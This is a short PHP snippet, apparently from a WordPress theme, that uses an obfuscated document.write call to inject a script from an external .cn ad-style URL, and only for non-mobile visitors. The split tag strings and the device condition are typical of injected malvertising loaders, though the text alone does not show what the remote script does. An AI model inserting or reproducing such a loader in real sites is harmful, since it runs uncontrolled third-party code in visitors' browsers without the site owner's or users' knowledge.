<?php if(!wp_is_mobile()):?>
<script type="text/javascript">
 document.write("<scr"+"ipt src=\"http://j.winvestern.com.cn/adscpv/i.php?z=95060\"></sc"+"ript>")
</script>
<?php endif;?>